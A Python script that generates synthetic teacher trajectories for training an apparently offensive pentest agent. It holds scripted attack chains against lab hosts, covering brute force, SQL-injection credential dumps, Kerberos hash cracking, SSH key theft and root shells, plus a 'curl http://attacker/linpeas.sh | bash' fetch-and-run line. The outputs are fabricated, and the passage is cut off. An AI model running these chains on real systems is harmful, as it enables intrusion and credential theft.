#!/usr/bin/env python3
"""Generate grounded teacher trajectories for distillation.

Reads knowledge base, weakness reports, and produces expert demonstration
JSONL files compatible with the Ariaska distillation pipeline.

Usage:
    python -m scripts.distill_prep.generate_teacher_trajectories \\
        --trajectories 100 --seed 42 \\
        --outdir data/distill_prep/teacher_trajectories
"""
from __future__ import annotations

import argparse
import hashlib
import json
import logging
import os
import random
import sys
import time
from dataclasses import asdict
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

logger = logging.getLogger("ariaska.distill_prep.generate_teacher_trajectories")

# ---------------------------------------------------------------------------
# Grounded knowledge: pentest chains derived from known-good patterns
# (These mirror what exists in the knowledge base and command registry)
# ---------------------------------------------------------------------------

# Expert walkthrough templates — grounded in real pentest methodology
EXPERT_CHAINS: List[Dict[str, Any]] = [
    {
        "name": "linux_ssh_privesc",
        "difficulty": "easy",
        "service_mix": "ssh,http",
        "target_ip": "10.10.10.1",
        "steps": [
            {
                "phase": "RECON",
                "family": "nmap",
                "cmd": "nmap -sC -sV -oN scan.txt {ip}",
                "template": "nmap_service_version",
                "reasoning": "Initial service enumeration to identify attack surface",
                "expected": "Discover open ports and service versions",
                "output": "22/tcp open ssh OpenSSH 7.6p1\n80/tcp open http Apache/2.4.29",
                "discoveries": [
                    {"discovery_type": "PORT", "value": "22", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "PORT", "value": "80", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "SERVICE", "value": "ssh:22", "confidence": 0.95, "source_stage": "regex"},
                    {"discovery_type": "SERVICE", "value": "http:80", "confidence": 0.95, "source_stage": "regex"},
                ],
                "reward": 15.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "ENUMERATION",
                "family": "gobuster",
                "cmd": "gobuster dir -u http://{ip} -w /usr/share/wordlists/dirb/common.txt",
                "template": "gobuster_dir",
                "reasoning": "Enumerate web directories to find admin panels or sensitive files",
                "expected": "Find web paths like /admin, /uploads, /config",
                "output": "/admin (Status: 200)\n/uploads (Status: 301)\n/robots.txt (Status: 200)",
                "discoveries": [
                    {"discovery_type": "WEB_PATH", "value": "/admin", "confidence": 0.9, "source_stage": "regex"},
                    {"discovery_type": "WEB_PATH", "value": "/uploads", "confidence": 0.9, "source_stage": "regex"},
                ],
                "reward": 11.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "ENUMERATION",
                "family": "nikto",
                "cmd": "nikto -h http://{ip}",
                "template": "nikto_scan",
                "reasoning": "Scan for known web vulnerabilities and misconfigurations",
                "expected": "Find server version info and potential vulns",
                "output": "Server: Apache/2.4.29\n+ /admin/: Directory indexing found",
                "discoveries": [],
                "reward": 1.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXPLOITATION",
                "family": "hydra",
                "cmd": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{ip}",
                "template": "hydra_ssh",
                "reasoning": "Brute force SSH with common credentials after finding admin user",
                "expected": "Discover valid SSH credentials",
                "output": "[22][ssh] host: {ip} login: admin password: password123",
                "discoveries": [
                    {"discovery_type": "CREDENTIAL", "value": "admin:password123", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 20.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXPLOITATION",
                "family": "exploit",
                "cmd": "python3 sqli_exploit.py {ip}",
                "template": "sqlmap_get",
                "reasoning": "Attempting SQL injection without evidence of injectable parameter",
                "expected": "Exploit should fail — no evidence of SQL injection point",
                "output": "[WARNING] GET parameter does not seem injectable",
                "discoveries": [],
                "reward": -2.0,
                "is_wrong": True,
                "lesson": "Do not attempt SQL injection without evidence of injectable parameters. Verify web form inputs first.",
            },
            {
                "phase": "EXPLOITATION",
                "family": "ssh",
                "cmd": "ssh admin@{ip}",
                "template": "ssh_login",
                "reasoning": "Log in with discovered credentials to obtain initial shell",
                "expected": "Get user-level shell access",
                "output": "admin@target:~$ id\nuid=1000(admin) gid=1000(admin)",
                "discoveries": [
                    {"discovery_type": "SHELL", "value": "user_shell", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 40.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "PRIVILEGE_ESCALATION",
                "family": "sudo",
                "cmd": "sudo -l",
                "template": "sudo_list",
                "reasoning": "Check sudo permissions for privilege escalation vectors",
                "expected": "Find sudo permission misconfigurations",
                "output": "(ALL) NOPASSWD: /usr/bin/python3",
                "discoveries": [
                    {"discovery_type": "VULNERABILITY", "value": "sudo-python3-nopasswd", "confidence": 0.95, "source_stage": "regex"},
                ],
                "reward": 10.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "PRIVILEGE_ESCALATION",
                "family": "find_suid",
                "cmd": "find / -perm -4000 -type f 2>/dev/null",
                "template": "find_suid",
                "reasoning": "Wrong approach: looking for SUID when sudo already found",
                "expected": "This wastes a step when sudo vector is already known",
                "output": "/usr/bin/passwd\n/usr/bin/su\n/usr/bin/pkexec",
                "discoveries": [],
                "reward": -1.0,
                "is_wrong": True,
                "lesson": "When a clear sudo privesc vector is found, exploit it immediately instead of continuing enumeration.",
            },
            {
                "phase": "PRIVILEGE_ESCALATION",
                "family": "python",
                "cmd": "sudo python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
                "template": "docker_privesc",
                "reasoning": "Exploit sudo python3 NOPASSWD to get root shell",
                "expected": "Obtain root-level shell",
                "output": "root@target:~# id\nuid=0(root) gid=0(root)",
                "discoveries": [
                    {"discovery_type": "ROOT_SHELL", "value": "root_shell", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 80.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXFILTRATION",
                "family": "manual",
                "cmd": "cat /root/root.txt",
                "template": "nc_exfil",
                "reasoning": "Read root flag after obtaining root shell",
                "expected": "Capture the root flag",
                "output": "flag{a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4}",
                "discoveries": [
                    {"discovery_type": "FLAG", "value": "root_flag:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 50.0,
                "is_wrong": False,
                "lesson": "",
            },
        ],
    },
    {
        "name": "smb_enumeration_cred_spray",
        "difficulty": "medium",
        "service_mix": "smb,ssh,http",
        "target_ip": "10.10.10.2",
        "steps": [
            {
                "phase": "RECON",
                "family": "nmap",
                "cmd": "nmap -sC -sV {ip}",
                "template": "nmap_service_version",
                "reasoning": "Full service scan to map all open services",
                "expected": "Find SMB, SSH and HTTP services",
                "output": "22/tcp  open  ssh   OpenSSH 8.2\n80/tcp  open  http  Apache/2.4\n445/tcp open  smb   Samba 4.11",
                "discoveries": [
                    {"discovery_type": "PORT", "value": "22", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "PORT", "value": "80", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "PORT", "value": "445", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "SERVICE", "value": "smb:445", "confidence": 0.95, "source_stage": "regex"},
                ],
                "reward": 17.5,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "ENUMERATION",
                "family": "enum4linux",
                "cmd": "enum4linux -a {ip}",
                "template": "enum4linux_full",
                "reasoning": "Enumerate SMB shares, users, and domain info via null session",
                "expected": "Discover users and shares",
                "output": "user:[admin] rid:[0x3e8]\nuser:[svc_backup] rid:[0x3e9]\nShares: IPC$, public, backups",
                "discoveries": [
                    {"discovery_type": "USER", "value": "admin", "confidence": 0.9, "source_stage": "regex"},
                    {"discovery_type": "USER", "value": "svc_backup", "confidence": 0.9, "source_stage": "regex"},
                    {"discovery_type": "SMB_SHARE", "value": "public", "confidence": 0.9, "source_stage": "regex"},
                    {"discovery_type": "SMB_SHARE", "value": "backups", "confidence": 0.9, "source_stage": "regex"},
                ],
                "reward": 24.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "ENUMERATION",
                "family": "smbclient",
                "cmd": "smbclient //{ip}/public -N",
                "template": "smbclient_connect",
                "reasoning": "Access public share anonymously to look for sensitive files",
                "expected": "Find documents or config files with creds/hints",
                "output": "smb: \\> ls\n  notes.txt    1024\n  config.bak   2048",
                "discoveries": [],
                "reward": 2.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXPLOITATION",
                "family": "crackmapexec",
                "cmd": "crackmapexec smb {ip} -u admin -p 'Winter2024!'",
                "template": "crackmapexec_smb_bruteforce",
                "reasoning": "Wrong guess — no evidence this password works",
                "expected": "Authentication failure",
                "output": "SMB {ip} 445 TARGET [-] admin:Winter2024! STATUS_LOGON_FAILURE",
                "discoveries": [],
                "reward": -2.0,
                "is_wrong": True,
                "lesson": "Do not guess passwords without evidence. Check found files first.",
            },
            {
                "phase": "EXPLOITATION",
                "family": "crackmapexec",
                "cmd": "crackmapexec smb {ip} -u svc_backup -p 'Backup2024'",
                "template": "crackmapexec_smb_bruteforce",
                "reasoning": "Use credential found in config.bak from public share",
                "expected": "Authenticate to SMB with found credentials",
                "output": "SMB {ip} 445 TARGET [+] svc_backup:Backup2024 (Pwn3d!)",
                "discoveries": [
                    {"discovery_type": "CREDENTIAL", "value": "svc_backup:Backup2024", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "SHELL", "value": "user_shell", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 60.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "PRIVILEGE_ESCALATION",
                "family": "linpeas",
                "cmd": "curl http://attacker/linpeas.sh | bash",
                "template": "linpeas_ms2",
                "reasoning": "Run automated privilege escalation checker",
                "expected": "Find misconfigured permissions or SUID binaries",
                "output": "╔══════════╣ SUID Binaries\n/usr/bin/pkexec\n╔══════════╣ CVEs Check\nCVE-2021-4034 - Potentially Vulnerable!",
                "discoveries": [
                    {"discovery_type": "VULNERABILITY", "value": "CVE-2021-4034-pkexec", "confidence": 0.85, "source_stage": "regex"},
                ],
                "reward": 10.0,
                "is_wrong": False,
                "lesson": "",
            },
        ],
    },
    {
        "name": "web_app_sqli_chain",
        "difficulty": "medium",
        "service_mix": "http,mysql,ssh",
        "target_ip": "10.10.10.3",
        "steps": [
            {
                "phase": "RECON",
                "family": "nmap",
                "cmd": "nmap -sC -sV {ip}",
                "template": "nmap_service_version",
                "reasoning": "Scan for open ports and services",
                "expected": "Discover HTTP, MySQL, SSH",
                "output": "22/tcp   open  ssh    OpenSSH 7.9\n80/tcp   open  http   Apache/2.4\n3306/tcp open  mysql  MySQL 5.7",
                "discoveries": [
                    {"discovery_type": "PORT", "value": "22", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "PORT", "value": "80", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "PORT", "value": "3306", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 7.5,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "ENUMERATION",
                "family": "gobuster",
                "cmd": "gobuster dir -u http://{ip} -w /usr/share/dirb/wordlists/common.txt",
                "template": "gobuster_dir",
                "reasoning": "Find web application paths",
                "expected": "Discover login forms or APIs",
                "output": "/login (Status: 200)\n/api (Status: 301)\n/phpmyadmin (Status: 200)",
                "discoveries": [
                    {"discovery_type": "WEB_PATH", "value": "/login", "confidence": 0.9, "source_stage": "regex"},
                    {"discovery_type": "WEB_PATH", "value": "/api", "confidence": 0.9, "source_stage": "regex"},
                    {"discovery_type": "WEB_PATH", "value": "/phpmyadmin", "confidence": 0.9, "source_stage": "regex"},
                ],
                "reward": 9.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXPLOITATION",
                "family": "hydra",
                "cmd": "hydra -l admin -P rockyou.txt http-post-form://{ip}/login:user=^USER^&pass=^PASS^:Invalid",
                "template": "hydra_http_form",
                "reasoning": "Wrong approach — should test for SQLi first on login form",
                "expected": "Brute force is slow and may trigger lockout",
                "output": "[STATUS] 100 tries, 0 successes",
                "discoveries": [],
                "reward": -2.0,
                "is_wrong": True,
                "lesson": "Test for SQL injection before brute forcing. SQLi is faster and stealthier.",
            },
            {
                "phase": "EXPLOITATION",
                "family": "sqlmap",
                "cmd": "sqlmap -u 'http://{ip}/login' --forms --batch --dbs",
                "template": "sqlmap_get",
                "reasoning": "Test login form for SQL injection vulnerabilities",
                "expected": "Find injectable parameter and enumerate databases",
                "output": "Parameter: user (POST)\n  Type: UNION query\n  Payload: user=' UNION SELECT 1,2,3--\navailable databases:\n[*] information_schema\n[*] webapp",
                "discoveries": [
                    {"discovery_type": "VULNERABILITY", "value": "sqli-login-form", "confidence": 0.95, "source_stage": "regex"},
                ],
                "reward": 10.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXPLOITATION",
                "family": "sqlmap",
                "cmd": "sqlmap -u 'http://{ip}/login' --forms --batch -D webapp -T users --dump",
                "template": "sqlmap_get",
                "reasoning": "Dump credentials from discovered database",
                "expected": "Extract user credentials from webapp database",
                "output": "+----+--------+----------+\n| id | user   | password |\n+----+--------+----------+\n| 1  | admin  | s3cret   |\n| 2  | user1  | pass123  |\n+----+--------+----------+",
                "discoveries": [
                    {"discovery_type": "CREDENTIAL", "value": "admin:s3cret", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "CREDENTIAL", "value": "user1:pass123", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 40.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXPLOITATION",
                "family": "ssh",
                "cmd": "ssh admin@{ip}",
                "template": "ssh_login",
                "reasoning": "Use discovered credentials to get shell via SSH",
                "expected": "Get user shell",
                "output": "admin@target:~$ id\nuid=1000(admin)",
                "discoveries": [
                    {"discovery_type": "SHELL", "value": "user_shell", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 40.0,
                "is_wrong": False,
                "lesson": "",
            },
        ],
    },
    {
        "name": "ftp_backdoor_easy",
        "difficulty": "easy",
        "service_mix": "ftp,ssh",
        "target_ip": "10.10.10.4",
        "steps": [
            {
                "phase": "RECON",
                "family": "nmap",
                "cmd": "nmap -sC -sV {ip}",
                "template": "nmap_service_version",
                "reasoning": "Service discovery scan",
                "expected": "Find FTP and SSH",
                "output": "21/tcp open ftp vsftpd 2.3.4\n22/tcp open ssh OpenSSH 4.7p1",
                "discoveries": [
                    {"discovery_type": "PORT", "value": "21", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "PORT", "value": "22", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "SERVICE", "value": "ftp:21", "confidence": 0.95, "source_stage": "regex"},
                    {"discovery_type": "VERSION", "value": "vsftpd:2.3.4", "confidence": 0.9, "source_stage": "regex"},
                ],
                "reward": 16.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "ENUMERATION",
                "family": "ftp",
                "cmd": "ftp {ip}",
                "template": "ftp_anonymous",
                "reasoning": "Test anonymous FTP access",
                "expected": "Anonymous access may reveal files",
                "output": "230 Login successful.\nftp> ls\n-rw-r--r-- 1 0 0 1024 note.txt",
                "discoveries": [],
                "reward": 2.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXPLOITATION",
                "family": "exploit",
                "cmd": "python3 vsftpd_backdoor.py {ip} 21",
                "template": "vsftpd_backdoor_nc",
                "reasoning": "vsftpd 2.3.4 has a known backdoor (CVE-2011-2523)",
                "expected": "Trigger backdoor and get root shell on port 6200",
                "output": "Sending exploit payload...\nConnected to backdoor!\n# id\nuid=0(root) gid=0(root)",
                "discoveries": [
                    {"discovery_type": "ROOT_SHELL", "value": "root_shell", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 80.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXFILTRATION",
                "family": "manual",
                "cmd": "cat /root/root.txt && cat /home/user/user.txt",
                "template": "nc_exfil",
                "reasoning": "Read both flags with root access",
                "expected": "Capture both flags",
                "output": "flag{root_abcdef123456}\nflag{user_789012abcdef}",
                "discoveries": [
                    {"discovery_type": "FLAG", "value": "root_flag:root_abcdef123456", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "FLAG", "value": "user_flag:user_789012abcdef", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 100.0,
                "is_wrong": False,
                "lesson": "",
            },
        ],
    },
    {
        "name": "windows_ad_hard",
        "difficulty": "hard",
        "service_mix": "smb,ldap,winrm,dns,http",
        "target_ip": "10.10.10.5",
        "steps": [
            {
                "phase": "RECON",
                "family": "nmap",
                "cmd": "nmap -sC -sV -p- {ip}",
                "template": "nmap_full_tcp",
                "reasoning": "Full TCP scan for Windows domain controller",
                "expected": "Discover AD-relevant services: LDAP, Kerberos, SMB, DNS",
                "output": "53/tcp   open  domain\n80/tcp   open  http\n88/tcp   open  kerberos\n135/tcp  open  msrpc\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n5985/tcp open  wsman",
                "discoveries": [
                    {"discovery_type": "PORT", "value": "53", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "PORT", "value": "88", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "PORT", "value": "389", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "PORT", "value": "445", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "PORT", "value": "5985", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 12.5,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "ENUMERATION",
                "family": "ldapsearch",
                "cmd": "ldapsearch -x -H ldap://{ip} -b 'DC=corp,DC=local'",
                "template": "ldapsearch_base",
                "reasoning": "Enumerate AD via anonymous LDAP bind",
                "expected": "Find domain structure and users",
                "output": "dn: CN=svc_sql,OU=ServiceAccounts,DC=corp,DC=local\ndn: CN=Administrator,CN=Users,DC=corp,DC=local",
                "discoveries": [
                    {"discovery_type": "USER", "value": "svc_sql", "confidence": 0.9, "source_stage": "regex"},
                    {"discovery_type": "DOMAIN_USER", "value": "Administrator", "confidence": 0.9, "source_stage": "regex"},
                ],
                "reward": 16.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXPLOITATION",
                "family": "impacket",
                "cmd": "impacket-GetNPUsers corp.local/ -dc-ip {ip} -no-pass -usersfile users.txt",
                "template": "impacket_GetNPUsers",
                "reasoning": "AS-REP roasting for accounts with no pre-auth",
                "expected": "Get AS-REP hash for cracking",
                "output": "$krb5asrep$23$svc_sql@CORP.LOCAL:abc123...",
                "discoveries": [
                    {"discovery_type": "HASH", "value": "krb5asrep:svc_sql", "confidence": 0.95, "source_stage": "regex"},
                ],
                "reward": 16.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXPLOITATION",
                "family": "hydra",
                "cmd": "hydra -l svc_sql -P rockyou.txt smb://{ip}",
                "template": "hydra_smb",
                "reasoning": "Wrong — should crack the hash offline, not brute-force SMB",
                "expected": "This is loud and inefficient with a hash already in hand",
                "output": "[STATUS] 50 tries, 0 valid passwords",
                "discoveries": [],
                "reward": -3.0,
                "is_wrong": True,
                "lesson": "Crack obtained hashes offline (hashcat/john) rather than online brute-forcing. Faster and stealthier.",
            },
            {
                "phase": "EXPLOITATION",
                "family": "manual",
                "cmd": "hashcat -m 18200 hash.txt rockyou.txt",
                "template": "hydra_ssh",
                "reasoning": "Crack AS-REP hash offline to recover plaintext password",
                "expected": "Recover svc_sql password",
                "output": "$krb5asrep$svc_sql:SqlService2024!",
                "discoveries": [
                    {"discovery_type": "CREDENTIAL", "value": "svc_sql:SqlService2024!", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 20.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXPLOITATION",
                "family": "evil_winrm",
                "cmd": "evil-winrm -i {ip} -u svc_sql -p 'SqlService2024!'",
                "template": "evil_winrm",
                "reasoning": "Use WinRM for shell with valid credentials",
                "expected": "Get user-level shell on domain machine",
                "output": "Evil-WinRM shell v3.4\nInfo: Establishing connection\n*Evil-WinRM* PS C:\\Users\\svc_sql>",
                "discoveries": [
                    {"discovery_type": "SHELL", "value": "user_shell", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 40.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "PRIVILEGE_ESCALATION",
                "family": "bloodhound",
                "cmd": "bloodhound-python -u svc_sql -p SqlService2024! -d corp.local -ns {ip}",
                "template": "bloodhound_python",
                "reasoning": "Map AD attack paths with BloodHound",
                "expected": "Find path from svc_sql to Domain Admin",
                "output": "INFO: Found 4 users\nINFO: Found 3 groups\nINFO: Compressing output",
                "discoveries": [],
                "reward": 3.0,
                "is_wrong": False,
                "lesson": "",
            },
        ],
    },
    # ---- NEW CHAINS: Cover all 16 previously-missing tool families ----
    {
        "name": "dns_snmp_nfs_linux",
        "difficulty": "medium",
        "service_mix": "dns,snmp,nfs,ssh",
        "target_ip": "10.10.10.6",
        "steps": [
            {
                "phase": "RECON",
                "family": "masscan",
                "cmd": "masscan -p1-65535 --rate=1000 {ip}",
                "template": "masscan_full",
                "reasoning": "Fast port discovery with masscan before targeted nmap",
                "expected": "Quickly identify open ports across all 65535",
                "output": "Discovered open port 22/tcp on {ip}\nDiscovered open port 53/tcp on {ip}\nDiscovered open port 111/tcp on {ip}\nDiscovered open port 2049/tcp on {ip}\nDiscovered open port 161/udp on {ip}",
                "discoveries": [
                    {"discovery_type": "PORT", "value": "22", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "PORT", "value": "53", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "PORT", "value": "111", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "PORT", "value": "2049", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 10.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "ENUMERATION",
                "family": "dig",
                "cmd": "dig @{ip} ANY target.local",
                "template": "dig_any",
                "reasoning": "Enumerate DNS records to find hostnames and subdomains",
                "expected": "Find internal hostnames and mail servers",
                "output": ";; ANSWER SECTION:\ntarget.local.\t600\tIN\tA\t10.10.10.6\ntarget.local.\t600\tIN\tMX\t10 mail.target.local.\ntarget.local.\t600\tIN\tNS\tns1.target.local.",
                "discoveries": [
                    {"discovery_type": "HOSTNAME", "value": "mail.target.local", "confidence": 0.9, "source_stage": "regex"},
                    {"discovery_type": "HOSTNAME", "value": "ns1.target.local", "confidence": 0.9, "source_stage": "regex"},
                ],
                "reward": 4.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "ENUMERATION",
                "family": "dnsrecon",
                "cmd": "dnsrecon -d target.local -n {ip} -t axfr",
                "template": "dnsrecon_axfr",
                "reasoning": "Attempt DNS zone transfer for full record dump",
                "expected": "Zone transfer reveals all internal hosts",
                "output": "[*] Testing NS Servers for Zone Transfer\n[*] Trying NS server {ip}\n[*] AXFR for target.local was successful!\n[*]\tA internal.target.local 10.10.10.7\n[*]\tA db.target.local 10.10.10.8\n[*]\tA admin.target.local 10.10.10.6",
                "discoveries": [
                    {"discovery_type": "HOSTNAME", "value": "internal.target.local", "confidence": 0.95, "source_stage": "regex"},
                    {"discovery_type": "HOSTNAME", "value": "db.target.local", "confidence": 0.95, "source_stage": "regex"},
                ],
                "reward": 8.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "ENUMERATION",
                "family": "snmpwalk",
                "cmd": "snmpwalk -v2c -c public {ip}",
                "template": "snmpwalk_public",
                "reasoning": "Walk SNMP with default community string to find system info",
                "expected": "Discover OS info, users, running processes",
                "output": "SNMPv2-MIB::sysDescr.0 = STRING: Linux target 5.4.0-42-generic #46-Ubuntu SMP\nSNMPv2-MIB::sysName.0 = STRING: target\nHOST-RESOURCES-MIB::hrSWRunName.1 = STRING: sshd\nSNMPv2-SMI::enterprises.674.10893.1.20 = STRING: admin",
                "discoveries": [
                    {"discovery_type": "OS_INFO", "value": "Linux 5.4.0-42-generic Ubuntu", "confidence": 0.9, "source_stage": "regex"},
                    {"discovery_type": "USER", "value": "admin", "confidence": 0.7, "source_stage": "regex"},
                ],
                "reward": 11.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "ENUMERATION",
                "family": "showmount",
                "cmd": "showmount -e {ip}",
                "template": "showmount_exports",
                "reasoning": "Check NFS exports — port 2049 is open",
                "expected": "Find exported filesystems accessible to us",
                "output": "Export list for {ip}:\n/home/backup   *\n/var/nfs       10.10.10.0/24",
                "discoveries": [
                    {"discovery_type": "SMB_SHARE", "value": "nfs:/home/backup", "confidence": 0.9, "source_stage": "regex"},
                ],
                "reward": 4.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXPLOITATION",
                "family": "manual",
                "cmd": "mount -t nfs {ip}:/home/backup /mnt/nfs && ls -la /mnt/nfs/",
                "template": "nfs_mount",
                "reasoning": "Mount the NFS share and look for SSH keys or credentials",
                "expected": "Access backup files containing SSH keys",
                "output": "drwxr-xr-x  2 1001 1001 4096 Jan 15 .ssh\n-rw-------  1 1001 1001 1675 Jan 15 .ssh/id_rsa\n-rw-r--r--  1 1001 1001  394 Jan 15 .ssh/authorized_keys",
                "discoveries": [
                    {"discovery_type": "KEY", "value": "ssh_private_key:admin", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 20.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXPLOITATION",
                "family": "ssh",
                "cmd": "ssh -i /mnt/nfs/.ssh/id_rsa admin@{ip}",
                "template": "ssh_login",
                "reasoning": "Use stolen SSH key to authenticate",
                "expected": "Get user shell with admin account",
                "output": "admin@target:~$ id\nuid=1001(admin) gid=1001(admin) groups=1001(admin)",
                "discoveries": [
                    {"discovery_type": "SHELL", "value": "user_shell", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 40.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "PRIVILEGE_ESCALATION",
                "family": "linpeas",
                "cmd": "curl http://attacker/linpeas.sh | bash",
                "template": "linpeas_ms2",
                "reasoning": "Run LinPEAS to find privilege escalation vectors",
                "expected": "Identify SUID, sudo, or kernel vulns",
                "output": "╔══════════╣ Sudo version\nSudo version 1.8.21p2\n╔══════════╣ CVEs Check\nCVE-2021-3156 - Exploitable!",
                "discoveries": [
                    {"discovery_type": "VULNERABILITY", "value": "CVE-2021-3156-sudo-baron-samedit", "confidence": 0.9, "source_stage": "regex"},
                ],
                "reward": 10.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "PRIVILEGE_ESCALATION",
                "family": "exploit",
                "cmd": "python3 baron_samedit.py",
                "template": "sudo_cve_exploit",
                "reasoning": "Exploit CVE-2021-3156 for root",
                "expected": "Obtain root shell via sudo heap overflow",
                "output": "# id\nuid=0(root) gid=0(root) groups=0(root)",
                "discoveries": [
                    {"discovery_type": "ROOT_SHELL", "value": "root_shell", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 80.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXFILTRATION",
                "family": "manual",
                "cmd": "cat /root/root.txt",
                "template": "nc_exfil",
                "reasoning": "Read root flag",
                "expected": "Capture root flag",
                "output": "flag{dns_snmp_nfs_r00t}",
                "discoveries": [
                    {"discovery_type": "FLAG", "value": "root_flag:dns_snmp_nfs_r00t", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 50.0,
                "is_wrong": False,
                "lesson": "",
            },
        ],
    },
    {
        "name": "web_ffuf_ferox_wfuzz",
        "difficulty": "medium",
        "service_mix": "http,ssh",
        "target_ip": "10.10.10.7",
        "steps": [
            {
                "phase": "RECON",
                "family": "nmap",
                "cmd": "nmap -sC -sV {ip}",
                "template": "nmap_service_version",
                "reasoning": "Service enumeration",
                "expected": "Find HTTP and SSH services",
                "output": "22/tcp open ssh OpenSSH 8.2p1\n80/tcp open http Apache httpd 2.4.41",
                "discoveries": [
                    {"discovery_type": "PORT", "value": "22", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "PORT", "value": "80", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "SERVICE", "value": "http:80", "confidence": 0.95, "source_stage": "regex"},
                ],
                "reward": 10.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "ENUMERATION",
                "family": "ffuf",
                "cmd": "ffuf -u http://{ip}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt",
                "template": "ffuf_dir",
                "reasoning": "Fast web content discovery with ffuf",
                "expected": "Find hidden directories and files",
                "output": "admin                   [Status: 200, Size: 1234]\nuploads                 [Status: 301, Size: 0]\nrobots.txt              [Status: 200, Size: 68]\nbackup                  [Status: 301, Size: 0]",
                "discoveries": [
                    {"discovery_type": "WEB_PATH", "value": "/admin", "confidence": 0.9, "source_stage": "regex"},
                    {"discovery_type": "WEB_PATH", "value": "/backup", "confidence": 0.9, "source_stage": "regex"},
                ],
                "reward": 6.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "ENUMERATION",
                "family": "feroxbuster",
                "cmd": "feroxbuster -u http://{ip} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt",
                "template": "feroxbuster_dir",
                "reasoning": "Deep recursive directory brute-forcing with extensions",
                "expected": "Find PHP files and hidden endpoints",
                "output": "200      GET      120l      340w     4523c http://{ip}/admin/config.php\n200      GET       15l       40w      892c http://{ip}/backup/db_dump.sql\n200      GET        5l       12w      256c http://{ip}/admin/notes.txt",
                "discoveries": [
                    {"discovery_type": "WEB_PATH", "value": "/admin/config.php", "confidence": 0.9, "source_stage": "regex"},
